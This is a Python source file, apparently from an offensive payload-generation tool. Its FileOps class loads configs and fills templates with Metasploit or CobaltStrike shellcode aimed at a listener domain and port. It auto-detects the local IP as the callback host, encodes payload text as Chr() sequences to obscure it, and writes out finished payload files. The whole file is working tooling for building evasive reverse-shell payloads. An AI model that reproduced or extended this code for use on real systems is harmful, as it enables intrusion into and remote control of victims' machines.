import os
import socket
from configparser import ConfigParser, ExtendedInterpolation
from generator import Generator


class FileOps():
    configDir = ''
    selectedConfig = None

    def __init__(self, configDir):
        FileOps.configDir = configDir

    def getConfigs(self):
        fileList = []

        # http://stackoverflow.com/questions/16953842/using-os-walk-to-recursively-traverse-directories-in-python
        for base, dirs, files in os.walk(FileOps.configDir):
            path = base.split(FileOps.configDir)[-1]
            for f in files:
                filePath = "{0}/{1}".format(path, f)
                fileList.append(filePath)
        return(fileList)

    def getConfigDir(self):
        return(FileOps.configDir)

    def loadConfig(self, configName):
        FileOps.selectedConfig = ConfigParser(interpolation=ExtendedInterpolation(), comment_prefixes=None)
        FileOps.selectedConfig.optionxform = str  # disable configparser convert data to lowercase
        FileOps.selectedConfig.read("{0}{1}".format(FileOps.configDir, configName))

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            FileOps.updateCurrentConfig(self, "ListenerDomain", ip)
            FileOps.updateCurrentConfig(self, "HostedDomain", "http://" + ip)
        except:
            pass

        return(FileOps.selectedConfig)

    def setCurrentConfig(self, configObj):
        FileOps.selectedConfig = configObj

    def updateCurrentConfig(self, option, value):
        FileOps.selectedConfig[option]["var"] = value

    def getCurrentConfig(self):
        return(FileOps.selectedConfig)

    def generate(self, config):
        template = ConfigParser(interpolation=ExtendedInterpolation(), comment_prefixes=None)
        template.optionxform = str
        template.read(FileOps.selectedConfig["Type"]["template"])

        return (self.genFromTemplate(template))

    def genFromTemplate(self, template):
        processingMap = {"chrEncode": FileOps.genChrArray}

        framework = ''
        domain = ''
        port = ''
        params = []
        outfile = "output.gr8sct"
        runInfo = ''
        preserveWhitespace = False

        for config_section in FileOps.selectedConfig:
            if config_section != "DEFAULT" and config_section != "Type":
                var = FileOps.selectedConfig[config_section]["var"]
                params.append([config_section, var])

            if config_section == "Type":
                runInfo = FileOps.selectedConfig[config_section]["runInfo"]
                name = FileOps.selectedConfig[config_section]["name"]

            if config_section == "Output":
                outfile = FileOps.selectedConfig[config_section]["var"]

            if config_section == "Framework":
                framework = FileOps.selectedConfig[config_section]["var"]
            elif config_section == "ListenerDomain":
                domain = FileOps.selectedConfig[config_section]["var"]
            elif config_section == "ListenerPort":
                port = FileOps.selectedConfig[config_section]["var"]
            elif config_section == "Payload":
                payload = FileOps.selectedConfig[config_section]["var"]

        generator = Generator()

        for template_section in template:
            section = template[template_section]
            if template_section == "ShellCodex64":
                extraProcessing = None
                try:
                    extraProcessing = section["process"]
                except KeyError:
                    extraProcessing = None

                if framework == "CobaltStrike":
                    shellcodex64 = generator.encodeShellcode(section["value"], payload, extraProcessing)
                    section["value"] = shellcodex64
                else:
                    # Metasploit 64 bit shellcode generation
                    shellcodex64 = generator.genShellcode(domain, port, "x64", name, payload, extraProcessing)
                    section["value"] = shellcodex64

            elif template_section == "ShellCodex86" or template_section == "ShellCode":
                extraProcessing = None
                try:
                    extraProcessing = section["process"]
                except KeyError:
                    extraProcessing = None

                if framework == "CobaltStrike":
                    # shellcodex86 = input('Paste your CobaltStrike shellcode')
                    # section["value"] = shellcodex86
                    shellcodex86 = generator.encodeShellcode(section["value"], payload, extraProcessing)
                    section["value"] = str(shellcodex86)
                else:
                    shellcodex86 = generator.genShellcode(domain, port, "x86", name, payload, extraProcessing)
                    section["value"] = shellcodex86

            elif template_section == "Processing":
                try:
                    section["value"] = processingMap[section["process"]](section["value"])
                except KeyError:
                    print("Error: Template Processing type {0} is not supported".format(section["process"]))

            elif template_section == "PreserveWhitespace":
                preserveWhitespace = section["value"]

            else:
                for param in params:
                    if template_section == param[0]:
                        section["value"] = param[1]

        payload = template.get("Template", "data")

        f = open(outfile, "w+")

        if preserveWhitespace == "True":
            payloadLines = payload.splitlines(keepends=True)
            for line in payloadLines:
                f.write(line[1:])

        else:
            f.write(payload)

        return runInfo

    def genChrArray(text):
        i = 0
        newText = ''
        for character in text:
            if i < 31:
                newText += "Chr({0})&".format(ord(character))
                i = i+1
            else:
                newText += "Chr({0})& _ \n".format(ord(character))
                i = 0

        if i != 0:
            newText = newText[0:-1]

        else:
            newText = newText[0:-5]

        return newText

    def fileCleanUp(self):
        files = ["./GenerateAll/gr8sct.rc", "./GenerateAll/analyst.csv",
                 "./GenerateAll/gr8sct.bat" ]
        for f in files:
            try:
                os.remove(f)
            except FileNotFoundError:
                pass
